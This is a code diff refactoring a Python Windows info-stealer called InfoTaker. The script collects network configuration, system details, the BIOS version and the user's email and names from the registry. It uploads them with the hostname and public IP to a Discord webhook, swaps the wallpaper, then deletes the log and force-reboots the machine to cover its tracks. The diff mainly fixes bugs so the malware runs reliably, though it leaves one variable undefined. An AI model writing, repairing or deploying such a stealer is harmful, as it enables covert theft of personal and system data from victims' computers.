@@ -5,15 +5,8 @@ import winreg
 import requests
 import subprocess
 
-# Get the current username of the logged-in user
-username = os.getlogin()
-
-# Path to the temporary directory for the current user
-tempPath = f"C:/Users/{username}/AppData/Local/Temp"
-os.chdir(tempPath)
-
-
-class InfoTaker():
+class InfoTaker:
+    @staticmethod
     def decodeOutput(output):
         # Decode the output from a subprocess call, handling potential Unicode errors
         try:
@@ -21,24 +14,31 @@ class InfoTaker():
         except UnicodeDecodeError:
             return output.decode('utf-8', errors='replace')
 
+    @staticmethod
     def executeCommand(command):
         # Execute a shell command and return its output or error message
         try:
             output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-            return decodeOutput(output).strip()
+            return InfoTaker.decodeOutput(output).strip()
         except subprocess.CalledProcessError as e:
-            return f"Error: {decodeOutput(e.output).strip()}"
+            return f"Error: {InfoTaker.decodeOutput(e.output).strip()}"
         except Exception as e:
             return f"Error: {str(e)}"
 
+    @staticmethod
     def getPublicIp():
         # Get the public IP address of the machine
-        return requests.get('https://api.ipify.org').content.decode('utf8')
+        try:
+            return requests.get('https://api.ipify.org').content.decode('utf8')
+        except requests.RequestException as e:
+            return f"Error getting public IP: {str(e)}"
 
+    @staticmethod
     def getLocalNetworkInfo():
         # Get local network configuration information
         return InfoTaker.executeCommand('ipconfig /all')
 
+    @staticmethod
     def getRegistryValue(path, key):
         # Retrieve a value from the Windows registry
         try:
@@ -49,6 +49,7 @@ class InfoTaker():
         except Exception as e:
             return str(e)
 
+    @staticmethod
     def getUserInfoFromRegistry():
         # Get user information (Email, FirstName, LastName) from the Windows registry
         userInfo = {}
@@ -82,10 +83,12 @@ class InfoTaker():
         
         return userInfo
 
+    @staticmethod
     def getBiosVersion():
         # Retrieve the BIOS version from the Windows registry
         return InfoTaker.getRegistryValue(r"HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion")
 
+    @staticmethod
     def getSystemInfoWindows():
         # Gather various system information using WMIC commands
         info = {}
@@ -119,12 +122,12 @@ class InfoTaker():
         
         return info
 
+    @staticmethod
     def getSystemInfo():
         # Retrieve system information using the 'systeminfo' command
         return InfoTaker.executeCommand('systeminfo')
 
-
-
+    @staticmethod
     def saveNetworkAndSystemInfo():
         # Path to the log file
         logFilePath = os.path.join("BootLog.txt")
@@ -146,22 +149,26 @@ class InfoTaker():
         
         return logFilePath
 
+    @staticmethod
     def deleteTrace():
         os.system("del /f BootLog.txt")
         os.system("del /f wallpaper.png")
         os.system("shutdown /r /t 0")
         
+    @staticmethod
     def funnyTrace():
         os.chdir(tempPath)
-        url = 'https://exaple.com/exaple.jpg'  # Replace with the URL of the image
-        response = requests.get(url)
-        
-        if response.status_code == 200:
-            with open('wallpaper.png', 'wb') as file:
-                file.write(response.content)
-            print("File downloaded successfully!")
-        else:
-            print(f"Failed to download file. Status code: {response.status_code}")
+        url = 'https://example.com/example.jpg'  # Replace with a valid URL
+        try:
+            response = requests.get(url)
+            if response.status_code == 200:
+                with open('wallpaper.png', 'wb') as file:
+                    file.write(response.content)
+                print("File downloaded successfully!")
+            else:
+                print(f"Failed to download file. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error downloading file: {str(e)}")
         
         wallpaper_path = "wallpaper.png"
         # Define constants
@@ -180,6 +187,7 @@ class InfoTaker():
             )
             print("Wallpaper changed successfully!")
 
+    @staticmethod
     def sendFileToDiscord(filePath, webhookUrl):
         # Send the specified file to a Discord webhook
         if os.path.exists(filePath):
@@ -189,24 +197,26 @@ class InfoTaker():
                     files={"file": file},
                     data={"content": f"Information of the PC: " + socket.gethostname() + ". IP: " + InfoTaker.getPublicIp()}
                 )
-                if response.status_code == 204 or 200:
+                if response.status_code in (200, 204):
                     print("File sent successfully!")
                 else:
-                    print(f"Errore while sending the file: {response.status_code} - {response.text}")
+                    print(f"Error while sending the file: {response.status_code} - {response.text}")
         else:
             print(f"File {filePath} not found!")
 
-# URL of the Discord webhook
-webhookUrl = "DISCORD_WEBHOOK_HERE"
 
-# Execute the function to save network and system information
-infoFilePath = InfoTaker.saveNetworkAndSystemInfo()
+if __name__ == "__main__":
+    # URL of the Discord webhook
+    webhookUrl = "DISCORD_WEBHOOK_HERE"
 
-# Send the log file to the Discord webhook
-InfoTaker.sendFileToDiscord(infoFilePath, webhookUrl)
+    # Execute the function to save network and system information
+    infoFilePath = InfoTaker.saveNetworkAndSystemInfo()
 
-# change wallpaper
-InfoTaker.funnyTrace()
+    # Send the log file to the Discord webhook
+    InfoTaker.sendFileToDiscord(infoFilePath, webhookUrl)
 
-# delete info file and reboot the system
-InfoTaker.deleteTrace()
+    # Change wallpaper
+    InfoTaker.funnyTrace()
+
+    # Delete info file and reboot the system
+    InfoTaker.deleteTrace()
